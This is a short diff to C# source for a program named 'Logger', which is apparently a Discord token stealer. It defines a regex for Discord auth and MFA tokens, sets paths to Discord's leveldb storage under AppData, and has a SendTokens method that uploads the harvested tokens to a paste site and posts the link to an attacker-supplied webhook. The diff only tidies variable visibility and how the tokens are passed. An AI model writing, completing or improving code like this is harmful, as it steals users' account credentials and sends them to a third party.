@@ -11,9 +11,9 @@ namespace Logger
     {
         public readonly string webHook = string.Empty; // <- Webhook goes here inside quotes.
         private string regexPattern = @"(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})";
-        public StringBuilder mfaTokens = new StringBuilder();
-        public StringBuilder normalTokens = new StringBuilder();
-        public static StringBuilder tokens = new StringBuilder();
+        private StringBuilder mfaTokens = new StringBuilder();
+        private StringBuilder normalTokens = new StringBuilder();
+        public StringBuilder tokens = new StringBuilder();
 
         private string appdataDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discord\Local Storage\leveldb";
         private string appdata_PTBDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discordptb\Local Storage\leveldb";
@@ -68,14 +68,13 @@ namespace Logger
 
         public void SendTokens()
         {
-            Paste pasteClassInstance = new Paste();
-            pasteClassInstance.UploadPaste();
-
+            Paste pasteInstance = new Paste();
             HttpClient webhookSender = new HttpClient();
+            pasteInstance.UploadPaste(ref tokens);
 
             Dictionary<string, string> tokenData = new Dictionary<string, string>
             {
-                { "content", pasteClassInstance.finalURL },
+                { "content", pasteInstance.finalURL },
                 { "username", "https://github.com/ihaai" },
                 { "avatar_url", "https://cdn.discordapp.com/attachments/582786562295857162/916249071457554472/unknown.png" }
             };
